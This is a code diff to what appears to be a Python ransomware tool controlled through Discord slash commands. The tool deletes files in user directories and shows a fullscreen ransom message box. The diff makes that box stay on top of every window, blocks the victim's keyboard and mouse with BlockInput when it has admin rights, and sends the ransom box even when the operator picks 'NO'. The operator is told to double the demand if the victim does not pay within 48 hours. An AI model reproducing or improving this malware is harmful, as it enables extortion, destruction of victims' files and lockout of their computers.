@@ -155,8 +155,8 @@ def spam_messagebox():
 
 
 
-    
-    root.attributes('-fullscreen', True) # Set fullscreen || SET TO TRUE
+    root.attributes('-topmost', True) # Puts message box infont of everything else
+    root.attributes('-fullscreen', True) # Set message box to fullscreen
     root.mainloop()
 
 
@@ -346,7 +346,6 @@ async def DeleteFiles_command(ctx: SlashContext, usersdir: str):
         file_input = usersdir
         if os.path.exists(file_input):
             if file_input !="":
-                import time
                 if os.path.isfile(file_input)==False:
                         for (dirpath, dirnames, filenames) in os.walk(file_input):
                             EXCLUDE_DIRECTORY = (
@@ -391,7 +390,6 @@ async def DeleteFiles_command(ctx: SlashContext, usersdir: str):
                                     )
                                     if l.endswith(EXTENSIONSS):
                                         # Delete folder . .    
-                                        import os
                                         try:
                                             os.remove(l)
                                         except OSError as e:
@@ -402,7 +400,6 @@ async def DeleteFiles_command(ctx: SlashContext, usersdir: str):
                                         pass
                 else:
                     # Delete file . .  
-                    import os
                     try:
                         os.remove(file_input)
                         await ctx.send("Successfully deleted File!")
@@ -416,7 +413,7 @@ async def DeleteFiles_command(ctx: SlashContext, usersdir: str):
             await ctx.send(f"DIR does not exist! ```{file_input}```")
 
 
-@slash.slash(name="SendMessageBox", description="Send final message box once ready", guild_ids=g)
+@slash.slash(name="SendMessageBox", description="Send final message box only once ready", guild_ids=g)
 async def SendMessageBox_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
         buttons = [
@@ -430,14 +427,20 @@ async def SendMessageBox_command(ctx: SlashContext):
                 ),
               ]
         action_row = create_actionrow(*buttons)
-        await ctx.send("Are you done Encrypting all folders u want to?", components=[action_row])
+        await ctx.send("Do u want to also block the users input? (Admin Rights Required)", components=[action_row])
 
         res = await client.wait_for('button_click')
         if res.component.label == "YES":
             await ctx.send(content="Sent! ```If victim does not pay within 48 hours double the payment price```", hidden=True)
-            spam_messagebox()
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:
+                ok = windll.user32.BlockInput(True)
+                spam_messagebox()
+            else:
+                await ctx.send("**Admin Rights Required!**")
         else:
-            await ctx.send(content="Cancelled sending!", hidden=True)
+            await ctx.send(content="Sent! ```If victim does not pay within 48 hours double the payment price```", hidden=True)
+            spam_messagebox()
 
         
 
